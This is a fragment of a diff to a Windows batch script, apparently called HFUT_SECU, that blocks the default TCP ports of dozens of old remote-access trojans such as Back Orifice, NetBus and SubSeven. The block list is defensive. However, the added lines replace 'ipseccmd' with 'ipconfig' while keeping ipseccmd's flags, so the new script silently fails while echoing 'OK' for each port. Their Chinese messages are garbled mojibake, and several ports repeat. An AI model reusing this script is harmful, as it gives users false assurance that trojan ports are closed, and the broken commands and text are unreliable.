-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíPass RipperÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5321" -f *+0:5321:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíFirehotckerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/666" -f *+0:666:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíAttack FTPÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5400" -f *+0:5400:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíBlade RunnerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/21554" -f *+0:21554:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíGirlFriendÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5401" -f *+0:5401:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíBlade Runner 1.xÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50766" -f *+0:50766:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíFore SchwindlerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5402" -f *+0:5402:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíBlade Runner 2.xÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/34324" -f *+0:34324:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíTiny Telnet ServerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5569" -f *+0:5569:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíRobo-HackÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30999" -f *+0:30999:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíKuangÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6670" -f *+0:6670:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíDeepThroatÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/11000" -f *+0:11000:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSenna Spy TrojansÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6771" -f *+0:6771:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíDeepThroatÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23456" -f *+0:23456:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíWhackJobÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6969" -f *+0:6969:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíGateCrasherÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/555" -f *+0:555:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíPhase0Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6969" -f *+0:6969:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíPriorityÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5400" -f *+0:5400:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíBlade RunnerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7000" -f *+0:7000:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíRemote GrabÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4950" -f *+0:4950:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíIcqTrojanÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7300" -f *+0:7300:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetMonitorÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9989" -f *+0:9989:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíInIkillerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7301" -f *+0:7301:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetMonitor 1.xÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9872" -f *+0:9872:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíPortal Of DoomÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetMonitor 2.xÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/11223" -f *+0:11223:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíProgenic TrojanÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7307" -f *+0:7307:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetMonitor 3.xÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/22222" -f *+0:22222:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíProsiak 0.47Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7308" -f *+0:7308:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetMonitor 4.xÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/53001" -f *+0:53001:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíRemote Windows ShutdownÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7789" -f *+0:7789:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíICKillerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5569" -f *+0:5569:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíRoboHackÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9872" -f *+0:9872:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíPortal of DoomÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/31338" -f *+0:31338:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Back Orificeé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/8102" -f *+0:8102:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ç½‘ç»œç¥å·é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2000" -f *+0:2000:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬é»‘æ´2000é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/31339" -f *+0:31339:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetSpy DKé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2001" -f *+0:2001:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬é»‘æ´2001é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/31666" -f *+0:31666:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬BOWhacké»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/34324" -f *+0:34324:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬BigGlucké»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ç½‘ç»œç²¾çµ3.0ï¼Œnetspy3.0é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/40412" -f *+0:40412:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬The Spyé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/40421" -f *+0:40421:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Masters Paradiseé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/8011" -f *+0:8011:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬wryï¼Œèµ–å°å­ï¼Œç«å‡¤å‡°é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/40422" -f *+0:40422:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Masters Paradise 1.xé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/23444" -f *+0:23444:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ç½‘ç»œå…¬ç‰›ï¼Œnetbullé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/40423" -f *+0:40423:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Masters Paradise 2.xé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/23445" -f *+0:23445:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ç½‘ç»œå…¬ç‰›ï¼Œnetbullé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/40426" -f *+0:40426:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Masters Paradise 3.xé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/50505" -f *+0:50505:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Sockets de Troieé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/27374" -f *+0:27374:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Sub Seven 2.0+ï¼Œ77ï¼Œä¸œæ–¹é­”çœ¼é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/50766" -f *+0:50766:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Foreé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/53001" -f *+0:53001:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Remote Windows Shutdowné»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/61466" -f *+0:61466:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Telecommandoé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/121" -f *+0:121:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬BO jammerkillahVé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/666" -f *+0:666:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Satanz Backdooré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/65000" -f *+0:65000:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Devilé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Silenceré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/6400" -f *+0:6400:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬The tHingé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1600" -f *+0:1600:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Shivka-Burkaé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/12346" -f *+0:12346:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetBus 1.xé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1807" -f *+0:1807:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬SpySenderé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/20034" -f *+0:20034:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetBus Proé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1981" -f *+0:1981:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Shockraveé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1243" -f *+0:1243:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬SubSevené»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬WebExé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/30100" -f *+0:30100:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetSphereé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1011" -f *+0:1011:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Doly Trojané»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Silenceré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1170" -f *+0:1170:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Psyber Stream Serveré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/20000" -f *+0:20000:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Milleniumé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1234" -f *+0:1234:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Ultors Trojané»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/65000" -f *+0:65000:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Devil 1.03é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1245" -f *+0:1245:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬VooDoo Dollé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetMonitoré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1492" -f *+0:1492:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬FTP99CMPé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1170" -f *+0:1170:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Streaming Audio Trojané»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1999" -f *+0:1999:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬BackDooré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/30303" -f *+0:30303:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Socket23é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2001" -f *+0:2001:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Trojan Cowé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/6969" -f *+0:6969:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Gatecrasheré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Ripperé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/61466" -f *+0:61466:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Telecommandoé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2115" -f *+0:2115:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Bugsé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/12076" -f *+0:12076:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Gjameré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2140" -f *+0:2140:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Deep Throaté»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/4950" -f *+0:4950:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬IcqTrojené»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2140" -f *+0:2140:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬The Invasoré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/16969" -f *+0:16969:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Priotrityé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2801" -f *+0:2801:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Phineas Phuckeré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1245" -f *+0:1245:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Vodooé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/30129" -f *+0:30129:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Masters Paradiseé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5742" -f *+0:5742:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Wincrashé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/3700" -f *+0:3700:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Portal of Doomé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2583" -f *+0:2583:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Wincrash2é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/4092" -f *+0:4092:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬WinCrashé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1033" -f *+0:1033:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Netspyé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/4590" -f *+0:4590:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ICQTrojané»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1981" -f *+0:1981:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ShockRaveé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5000" -f *+0:5000:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Sockets de Troieé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/555" -f *+0:555:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Stealth Spyé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5001" -f *+0:5001:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Sockets de Troie 1.xé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Pass Ripperé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5321" -f *+0:5321:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Firehotckeré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/666" -f *+0:666:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Attack FTPé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5400" -f *+0:5400:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Blade Runneré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/21554" -f *+0:21554:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬GirlFriendé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5401" -f *+0:5401:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Blade Runner 1.xé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/50766" -f *+0:50766:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Fore Schwindleré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5402" -f *+0:5402:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Blade Runner 2.xé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/34324" -f *+0:34324:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Tiny Telnet Serveré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5569" -f *+0:5569:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Robo-Hacké»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/30999" -f *+0:30999:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Kuangé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/6670" -f *+0:6670:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬DeepThroaté»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/11000" -f *+0:11000:TCP -n BLOCK -x >nul
